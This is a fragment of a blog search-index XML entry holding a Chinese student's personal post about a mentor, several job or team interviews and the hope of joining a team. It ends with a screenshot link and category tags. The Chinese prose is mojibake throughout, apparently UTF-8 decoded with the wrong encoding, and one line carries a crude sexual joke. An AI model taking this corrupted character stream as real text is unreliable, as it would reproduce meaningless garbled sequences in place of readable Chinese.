åŒç­‰çš„æˆé•¿ã€‚è°¢è°¢åœ¨æˆ‘çš„å¤§äºŒä¸Šçš„è¿™å­¦æœŸï¼Œè®©æˆ‘ç¢°åˆ°ä¸­å“¥ã€‚</p><p>ä»–è¿˜ä¸æŠŠå­¦ä¹ èµ„æ–™è®©æˆ‘ç™½å«–ï¼Œè‡³ä»Šæˆ‘è¿˜æ˜¯ä¸èƒ½ç†è§£ä¸ºä»€ä¹ˆï¼ï¼ï¼ä¹Ÿè®¸åé¢æˆ‘ä¼šæ‡‚~~~æ˜¯ä¸æ˜¯ä»–è§‰å¾—å¤ªä¾¿å®œäº†ã€‚200å¯ä»¥è·Ÿå¥³æœ‹å‹æ’¸ç®¡ä¸¤æ¬¡äº†ã€‚</p><p>å­¦æŠ€æœ¯è·¯ä¸Šç¢°åˆ°è¿™æ ·ä¸€ä½æ©å¸ˆï¼Ÿå“ˆå“ˆå“ˆå“ˆå“ˆæˆ‘è§‰å¾—è‚¯å®šæ˜¯èƒ½å¤Ÿç®—çš„ä¸Šæˆ‘å¸ˆçˆ¶çš„ï¼Œå­¦ä¹ è·¯ä¸Šè®©æˆ‘å°‘æ‰“ç‚¹ç‹è€…ï¼Œé—®é—®é¢˜ä¹Ÿä¼šæŠ½ç©ºå›ç­”æˆ‘ã€‚å¤ªçˆ±äº†ï¼ï¼ï¼</p><p>å‰å‰ååè¿˜æœ‰å¾ˆå¤šäº‹ã€‚æœ‰äº›å¤ªéº»çƒ¦äº†ï¼Œå°±æ‡’å¾—è¯´äº†ã€‚å®³~~ï¼Œå¸Œæœ›æˆ‘æœªæ¥çš„é“è·¯ä¸Šï¼Œèƒ½å¤Ÿé‡åˆ°å¾ˆå¤šä¸­å“¥è¿™æ ·çš„äººï¼å¥½å¥½åšå¥½æ¥ä¸‹æ¥çš„ä»»åŠ¡â€¦.é©¬ä¸Šå°±è¦è¿›å…¥é“æ ¼äº†ï¼åšæŒï¼</p><h2 id="ç¬¬ä¸‰æ¬¡é¢è¯•"><a href="#ç¬¬ä¸‰æ¬¡é¢è¯•" class="headerlink" title="ç¬¬ä¸‰æ¬¡é¢è¯•"></a>ç¬¬ä¸‰æ¬¡é¢è¯•</h2><p>å¤ªä¹…äº†ï¼Œå¿˜è®°äº†å“ˆå“ˆå“ˆå“ˆ~~</p><h2 id="æœ€åä¸€æ¬¡"><a href="#æœ€åä¸€æ¬¡" class="headerlink" title="æœ€åä¸€æ¬¡"></a>æœ€åä¸€æ¬¡</h2><p>ä¸­å“¥å¤ªå¿™äº†ã€‚ç»“æœæ˜¯åˆ«çš„å¸ˆå‚…é¢è¯•çš„ã€‚ï¼ˆè¯´å®è¯è‡ªå·±ä¸åº”è¯¥è¿›é“æ ¼çš„ï¼Œä½†æ˜¯ç»™äº†æˆ‘è¿™ä¸ªæœºä¼šï¼Œå°±å¥½å¥½æŠŠæ¡ä½ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220224203017.png" alt="QQæˆªå›¾20220224203017"></p><p>â€‹    </p>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
